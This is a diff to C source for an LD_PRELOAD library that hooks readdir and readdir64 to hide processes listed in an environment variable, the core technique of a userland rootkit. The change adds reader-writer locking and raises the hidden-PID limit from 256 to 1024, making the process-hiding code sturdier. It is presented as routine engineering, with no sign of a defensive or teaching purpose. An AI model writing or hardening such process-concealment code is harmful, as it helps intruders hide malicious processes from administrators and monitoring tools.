@@ -6,14 +6,17 @@
 #include <dlfcn.h>
 #include <sys/types.h>
 #include <unistd.h>
+#include <pthread.h>
 
 /* Original function pointers */
 static struct dirent* (*original_readdir)(DIR *dirp) = NULL;
 static struct dirent64* (*original_readdir64)(DIR *dirp) = NULL;
 
-/* Hidden PIDs list (simple implementation) */
-static int hidden_pids[256] = {0};
+/* Hidden PIDs list with bounds checking and synchronization */
+#define MAX_HIDDEN_PIDS 1024
+static int hidden_pids[MAX_HIDDEN_PIDS] = {0};
 static int hidden_pids_count = 0;
+static pthread_rwlock_t hidden_pids_lock = PTHREAD_RWLOCK_INITIALIZER;
 
 /* Initialize original function pointers */
 static void init_hooks(void) {
@@ -25,14 +28,23 @@ static void init_hooks(void) {
 	}
 }
 
-/* Check if a PID should be hidden */
-static int is_hidden(pid_t pid) {
+/* Check if a PID should be hidden (must be called with lock held) */
+static int is_hidden_unlocked(pid_t pid) {
 	for (int i = 0; i < hidden_pids_count; i++) {
 		if (hidden_pids[i] == pid) {
 			return 1;
 		}
 	}
 	return 0;
+}
+
+/* Thread-safe wrapper to check if PID is hidden */
+static int is_hidden(pid_t pid) {
+	int result;
+	pthread_rwlock_rdlock(&hidden_pids_lock);
+	result = is_hidden_unlocked(pid);
+	pthread_rwlock_unlock(&hidden_pids_lock);
+	return result;
 }
 
 /* Parse PID from directory entry name */
@@ -102,8 +114,10 @@ void __attribute__((constructor)) init_hidden_pids(void) {
 		return;
 	}
 
+	pthread_rwlock_wrlock(&hidden_pids_lock);
+
 	char *token = strtok(env_copy, " ");
-	while (token && hidden_pids_count < 256) {
+	while (token && hidden_pids_count < MAX_HIDDEN_PIDS) {
 		pid_t pid = (pid_t)atoi(token);
 		if (pid > 0) {
 			hidden_pids[hidden_pids_count++] = pid;
@@ -111,5 +125,6 @@ void __attribute__((constructor)) init_hidden_pids(void) {
 		token = strtok(NULL, " ");
 	}
 
+	pthread_rwlock_unlock(&hidden_pids_lock);
 	free(env_copy);
 }
